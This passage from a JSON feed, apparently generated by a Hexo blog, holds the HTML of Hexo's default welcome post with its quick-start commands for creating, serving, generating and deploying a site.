            "content_html": "<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"quick-start\"><a class=\"markdownIt-Anchor\" href=\"#quick-start\">#</a> Quick Start</h2>\n<h3 id=\"create-a-new-post\"><a class=\"markdownIt-Anchor\" href=\"#create-a-new-post\">#</a> Create a new post</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"run-server\"><a class=\"markdownIt-Anchor\" href=\"#run-server\">#</a> Run server</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"generate-static-files\"><a class=\"markdownIt-Anchor\" href=\"#generate-static-files\">#</a> Generate static files</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"deploy-to-remote-sites\"><a class=\"markdownIt-Anchor\" href=\"#deploy-to-remote-sites\">#</a> Deploy to remote sites</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n",
            "tags": []
        }
    ]
}